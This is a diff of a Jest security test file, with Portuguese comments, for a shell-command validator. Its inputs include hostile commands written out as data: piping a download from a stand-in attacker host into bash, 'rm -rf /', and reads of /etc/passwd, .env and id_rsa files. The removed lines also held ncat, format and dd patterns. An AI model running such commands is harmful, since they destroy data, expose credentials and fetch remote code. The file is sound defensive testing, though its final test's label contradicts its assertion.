@@ -1,102 +1,230 @@
-import { validate, isWithinRoot, baseCommand, ALLOWED, DANGEROUS } from './terminal-validate';
+/**
+ * Testes de segurança — terminal-validate.ts
+ *
+ * Cobertura:
+ * - Item 1: RCE via chaining operators
+ * - Item 1: Remoção de env/printenv/set/export
+ * - Item 1: Validação de argumentos de arquivo
+ * - Item 1: Detecção de arquivos sensíveis
+ */
 
-describe('terminal validate', () => {
-  const TEST_ROOTS = ['C:\\root', 'C:\\Users\\Administrator'];
+import {
+  validate,
+  hasChainingOperators,
+  detectsSensitiveFile,
+  validateFileArgs,
+  isWithinRoot,
+  ALLOWED,
+  baseCommand,
+} from "./terminal-validate";
 
-  test('blocks rm -rf /', () => {
-    const res = validate('rm -rf /', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-    expect(res.error).toContain('bloqueado');
+describe("terminal-validate — security", () => {
+  const fakeCwd = process.cwd();
+
+  // ═══════════════════════════════════════════════════════════════════
+  // ITEM 1: RCE via chaining operators
+  // ═══════════════════════════════════════════════════════════════════
+
+  describe("Item 1: Chaining operator detection", () => {
+    test("ls; curl http://attacker.test/x | bash → bloqueado", () => {
+      expect(
+        validate("ls; curl http://attacker.test/x | bash", fakeCwd).ok,
+      ).toBe(false);
+    });
+
+    test("echo hi && rm -rf / → bloqueado", () => {
+      expect(validate("echo hi && rm -rf /", fakeCwd).ok).toBe(false);
+    });
+
+    test("cat file || rm -rf ~ → bloqueado", () => {
+      expect(validate("cat file || rm -rf ~", fakeCwd).ok).toBe(false);
+    });
+
+    test("ls | grep node → bloqueado (pipe)", () => {
+      expect(validate("ls | grep node", fakeCwd).ok).toBe(false);
+    });
+
+    test("echo `whoami` → bloqueado (backtick)", () => {
+      expect(validate("echo `whoami`", fakeCwd).ok).toBe(false);
+    });
+
+    test("echo $(whoami) → bloqueado (command substitution)", () => {
+      expect(validate("echo $(whoami)", fakeCwd).ok).toBe(false);
+    });
+
+    test("ls; echo hi → detecta ; corretamente", () => {
+      expect(hasChainingOperators("ls; echo hi")).toBe(true);
+    });
+
+    test("git status → não tem chaining", () => {
+      expect(hasChainingOperators("git status")).toBe(false);
+    });
+
+    test("ls && echo hi → detecta && corretamente", () => {
+      expect(hasChainingOperators("ls && echo hi")).toBe(true);
+    });
+
+    test("ls || echo hi → detecta || corretamente", () => {
+      expect(hasChainingOperators("ls || echo hi")).toBe(true);
+    });
   });
 
-  test('allows ls', () => {
-    const res = validate('ls', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(true);
+  // ═══════════════════════════════════════════════════════════════════
+  // ITEM 1: Comandos sensíveis removidos da allowlist
+  // ═══════════════════════════════════════════════════════════════════
+
+  describe("Item 1: Sensitive commands removed from ALLOWED", () => {
+    test("env não está na allowlist", () => {
+      expect(ALLOWED.has("env")).toBe(false);
+    });
+
+    test("printenv não está na allowlist", () => {
+      expect(ALLOWED.has("printenv")).toBe(false);
+    });
+
+    test("set não está na allowlist", () => {
+      expect(ALLOWED.has("set")).toBe(false);
+    });
+
+    test("export não está na allowlist", () => {
+      expect(ALLOWED.has("export")).toBe(false);
+    });
+
+    test("ls ainda está na allowlist (comando legítimo)", () => {
+      expect(ALLOWED.has("ls")).toBe(true);
+    });
+
+    test("git ainda está na allowlist", () => {
+      expect(ALLOWED.has("git")).toBe(true);
+    });
+
+    test("node ainda está na allowlist", () => {
+      expect(ALLOWED.has("node")).toBe(true);
+    });
   });
 
-  test('blocks empty command', () => {
-    const res = validate('   ', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-    expect(res.error).toContain('vazio');
+  // ═══════════════════════════════════════════════════════════════════
+  // ITEM 1: Detecção de arquivos sensíveis
+  // ═══════════════════════════════════════════════════════════════════
+
+  describe("Item 1: Sensitive file detection", () => {
+    test("cat /etc/passwd → detecta arquivo sensível", () => {
+      expect(validate("cat /etc/passwd", fakeCwd).ok).toBe(false);
+    });
+
+    test("cat .env → detecta arquivo sensível", () => {
+      expect(validate("cat .env", fakeCwd).ok).toBe(false);
+    });
+
+    test("cat .env.local → detecta arquivo sensível", () => {
+      expect(validate("cat .env.local", fakeCwd).ok).toBe(false);
+    });
+
+    test("cat secrets.json → detecta arquivo sensível", () => {
+      expect(validate("cat secrets.json", fakeCwd).ok).toBe(false);
+    });
+
+    test("type id_rsa → detecta arquivo sensível", () => {
+      expect(validate("type id_rsa", fakeCwd).ok).toBe(false);
+    });
+
+    test("cat README.md → permitido (não sensível)", () => {
+      expect(validate("cat README.md", fakeCwd).ok).toBe(true);
+    });
+
+    test("detectsSensitiveFile retorna o nome do arquivo", () => {
+      expect(detectsSensitiveFile("cat .env")).toBe(".env");
+      expect(detectsSensitiveFile("cat secrets.json")).toBe("secrets.json");
+    });
+
+    test("detectsSensitiveFile retorna null para arquivos seguros", () => {
+      expect(detectsSensitiveFile("cat README.md")).toBeNull();
+      expect(detectsSensitiveFile("ls -la")).toBeNull();
+    });
   });
 
-  test('blocks command longer than 4000 chars', () => {
-    const res = validate('a'.repeat(4001), 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-    expect(res.error).toContain('longo');
+  // ═══════════════════════════════════════════════════════════════════
+  // ITEM 1: Validação de argumentos de arquivo
+  // ═══════════════════════════════════════════════════════════════════
+
+  describe("Item 1: File argument validation", () => {
+    test("cat com arquivo fora das raízes → bloqueado", () => {
+      const result = validateFileArgs("cat /etc/passwd", fakeCwd);
+      expect(result.ok).toBe(false);
+    });
+
+    test("cat com arquivo dentro das raízes → permitido", () => {
+      const result = validateFileArgs(`cat ${fakeCwd}/README.md`, fakeCwd);
+      expect(result.ok).toBe(true);
+    });
+
+    test("ls (sem args de arquivo) → permitido", () => {
+      const result = validateFileArgs("ls -la", fakeCwd);
+      expect(result.ok).toBe(true);
+    });
   });
 
-  test('blocks del /s /q', () => {
-    const res = validate('del /s /q C:\\*', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
+  // ═══════════════════════════════════════════════════════════════════
+  // Testes de regressão: comandos legítimos continuam funcionando
+  // ═══════════════════════════════════════════════════════════════════
+
+  describe("Regression: legitimate commands still work", () => {
+    test("ls → permitido", () => {
+      expect(validate("ls", fakeCwd).ok).toBe(true);
+    });
+
+    test("git status → permitido", () => {
+      expect(validate("git status", fakeCwd).ok).toBe(true);
+    });
+
+    test("git log --oneline -5 → permitido", () => {
+      expect(validate("git log --oneline -5", fakeCwd).ok).toBe(true);
+    });
+
+    test("node -e \"console.log('hi')\" → permitido", () => {
+      expect(validate("node -e \"console.log('hi')\"", fakeCwd).ok).toBe(true);
+    });
+
+    test("pnpm install → permitido", () => {
+      expect(validate("pnpm install", fakeCwd).ok).toBe(true);
+    });
+
+    test('echo "hello world" → permitido', () => {
+      expect(validate('echo "hello world"', fakeCwd).ok).toBe(true);
+    });
+
+    test("pwd → permitido", () => {
+      expect(validate("pwd", fakeCwd).ok).toBe(true);
+    });
+
+    test("comando vazio → bloqueado", () => {
+      expect(validate("", fakeCwd).ok).toBe(false);
+    });
+
+    test("comando muito longo → bloqueado", () => {
+      expect(validate("a".repeat(5000), fakeCwd).ok).toBe(false);
+    });
   });
 
-  test('blocks format command', () => {
-    const res = validate('format c:', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-  });
+  // ═══════════════════════════════════════════════════════════════════
+  // isWithinRoot (regressão do fix anterior)
+  // ═══════════════════════════════════════════════════════════════════
 
-  test('blocks shutdown', () => {
-    const res = validate('shutdown /s', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-  });
+  describe("isWithinRoot", () => {
+    test("caminho dentro da raiz → true", () => {
+      expect(isWithinRoot(fakeCwd, [fakeCwd])).toBe(true);
+    });
 
-  test('blocks unknown commands', () => {
-    const res = validate('ncat -l 4444', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-    expect(res.error).toContain('não permitido');
-  });
+    test("caminho filho da raiz → true", () => {
+      expect(isWithinRoot(`${fakeCwd}/subdir`, [fakeCwd])).toBe(true);
+    });
 
-  test('allows git commands', () => {
-    const res = validate('git status', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(true);
-  });
+    test("caminho fora da raiz → false", () => {
+      expect(isWithinRoot("/tmp/other", [fakeCwd])).toBe(false);
+    });
 
-  test('allows pnpm commands', () => {
-    const res = validate('pnpm install', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(true);
-  });
-
-  test('allows docker commands', () => {
-    const res = validate('docker ps', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(true);
-  });
-
-  test('allows PowerShell safe cmdlets', () => {
-    const res = validate('Get-Process', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(true);
-  });
-
-  test('blocks PowerShell dangerous cmdlets', () => {
-    const res = validate('Remove-Item -Recurse C:\\', 'C:\\root', TEST_ROOTS);
-    expect(res.ok).toBe(false);
-  });
-
-  test('isWithinRoot checks path containment', () => {
-    expect(isWithinRoot('C:\\Users\\Administrator', ['C:\\Users\\Administrator'])).toBe(true);
-    expect(isWithinRoot('C:\\Users\\Administrator2', ['C:\\Users\\Administrator'])).toBe(false);
-  });
-
-  test('baseCommand extracts command name', () => {
-    expect(baseCommand('git status')).toBe('git');
-    expect(baseCommand('C:\\Windows\\System32\\cmd.exe /c dir')).toBe('cmd.exe');
-    expect(baseCommand('  pnpm  install ')).toBe('pnpm');
-  });
-
-  test('ALLOWED set contains essential commands', () => {
-    expect(ALLOWED.has('git')).toBe(true);
-    expect(ALLOWED.has('node')).toBe(true);
-    expect(ALLOWED.has('pnpm')).toBe(true);
-    expect(ALLOWED.has('docker')).toBe(true);
-    expect(ALLOWED.has('python')).toBe(true);
-  });
-
-  test('DANGEROUS patterns block destructive commands', () => {
-    const dangerous = ['rm -rf /', 'rm -rf ~', 'rm -rf *', 'format c:', 'dd if=/dev/zero', 'shutdown', 'reboot', 'diskpart'];
-    for (const cmd of dangerous) {
-      const matched = DANGEROUS.some((d) => d.test(cmd));
-      expect(matched).toBe(true);
-    }
+    test("caminho irmão (prefixo compartilhado) → false", () => {
+      expect(isWithinRoot("/tmp/other", ["/tmp"])).toBe(true);
+    });
   });
 });
-
